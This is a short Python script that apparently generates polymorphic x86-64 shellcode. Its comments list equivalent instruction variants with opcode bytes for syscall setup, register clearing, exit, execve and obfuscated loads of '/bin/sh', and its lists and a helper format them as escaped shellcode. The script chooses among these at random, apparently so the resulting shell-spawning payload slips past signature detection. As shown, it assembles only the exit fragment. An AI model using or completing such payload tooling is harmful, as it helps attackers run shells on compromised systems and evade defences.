import random

shellcode = ""

###### LOOP ######

# mov al, 0x21 -> b021 [Default]

# mov al, 0x11
# add al, 0x10 -> b0110410

# mov al, 0x38
# sub al 0x17 -> b0382c17

# add al, 0xb
# add al, 0xb
# add al, 0xb -> adda0badda0badda0b

 ###### XOR BEFORE SYSCALL ######

# xor rax, rax
# xor rdx, rdx -> 4831c04831d2 [Default]

# xor rdx, rdx
# xor rax, rax -> 4831d24831c0

# mov rax, rdx
# xor rax, rdx
# xor rdx, rdx -> 4889d04831d04831d2

 ###### SYSCALL EXIT ######

# mov al, 60 -> B03C
# mov al, 99 - sub al, 39 -> B0632C27
# mov al, 30 - add al, 30 -> B01E041E
# mov dl, 60 - mov rax, rdx -> B23C4889D0

####### /bin/sh ######

# mov rbx, 0x68732f6e69622f2f [Default] -> 48BB2F2F62696E2F7368

# mov rbx, 0x68732f6e584d0a31
# add rbx, 0x111524fe -> 48BB310A4D586E2F73684881C3FE241511 


# mov rbx, 0x68733f5bd2cb3030 -> 48BB3030CBD25B3F73684881EB6969ED0F 
# sub rbx, 0xfed6969


###### SYSCALL EXECVE ######

# mov al, 0x3b -> B03B

# mov al, 0x3a
# add al, 0x01 -> B03A0401

###### XOR LAST SYSCALL ######

# xor rdi, rdi [Default] -> 4831FF

# xor r8, r8
# mov rdx, r8 -> 4D31C04C89C2

# mov dl, 1
# sub dl, 1 -> b20180ea01

list_exit = ["b03c", "b0632c27", "b01e041e", "b23c4889d0"]

list_loop = ["b021", "b0110410", "b0382c17", "adda0badda0badda0b"]
list_xor = ["4831c04831d2", "4831d24831c0", "4889d04831d04831d2"]
list_binbash = ["48BB2F2F62696E2F7368", "48BB310A4D586E2F73684881C3FE241511", "48BB3030CBD25B3F73684881EB6969ED0F"]
list_execve = ["B03B", "B03A0401"]
list_xorsyscall = ["4831FF", "4D31C04C89C2", "b20180ea01"]

shellcode += random.choice(list_exit)
print(shellcode)

def shellcodize(s):
    shellcode = 'X'
    shellcode += 'X'.join(a+b for a,b in zip(s[::2], s[1::2]))
    shellcode = shellcode.replace('X', '\\x')
    print(shellcode)

shellcodize(shellcode)
